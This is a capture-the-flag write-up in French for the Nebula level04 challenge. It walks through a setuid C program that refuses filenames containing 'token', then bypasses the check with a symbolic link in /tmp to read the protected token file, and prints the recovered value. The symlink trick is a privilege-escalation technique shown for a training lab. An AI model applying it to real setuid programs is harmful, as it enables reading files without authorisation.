# Chalenge 04

Le but du challenge est de lire le fichier token qui se trouve dans `/home/flag04/token`.

On a acces au code source du programme :
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```
```bash
level04@nebula:/home/flag04$ ls
flag04  token
level04@nebula:/home/flag04$ ./flag04 
./flag04 [file to read]
level04@nebula:/home/flag04$ ./flag04 token 
You may not access 'token'
level04@nebula:/home/flag04$ cat token 
cat: token: Permission denied
```

Fonctionnement :
1. On initialise un char buffer de 1024 characteres : `char buf[1024]`.
2. On intialise deux entier `fd,rc`.
    - *Rappel : `fd` correspond au file descriptor et `rc` au return code*
3. Si aucun argument n'est donné au programme il affiche une erreur et fail avec le code`EXIT_FAILURE`.
4. Le programme vérifie ensuite que la sous-chaine `token` n'est pas dans le premier argument.
    - *Si on fait `/home/flag04/flag04 token` cela fail directement*
5. Le fichier est ensuite lu et le programme fail avec le code`EXIT_FAILURE` si on a pas les permissions pour le lire le fichier concerné.
6. Le programme lit 1024 octets du fichier et met `rc` au nombre d'octets lus, il fail si il y a un problème de lecture.
7. Une dernière verification est effectuée pour verifier que le programme a bien lu les données.
8. Le programme écrit sur le file descriptor 1 (la sortie standard `stdout`) les `rc` octets lu précédement.

### Exploitation

Le but est donc d'ouvrir le fichier `/home/flag04/token` grâce au programme `/home/flag04/flag04`.

On peut voir deja que `flag04` est **setuid `flag04`** : c'est à dire que les fichiers sont lus avec les permissions de `flag04`.

Le seul obstacle à contourner est donc le nom du fichier (on ne peut ni le copier ni le bouger car on a pas les permissions).

Il suffit alors juste de créer un lien symbolique avec un autre nom et à partir de cela on peut lire notre lien symbolique.

```bash
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/pas_un_t_word
level04@nebula:/home/flag04$ ./flag04 /tmp/pas_un_t_word 
06508b5e-8909-4f38-b630-fdb148a848a2
```

Et youpip à nous le flag !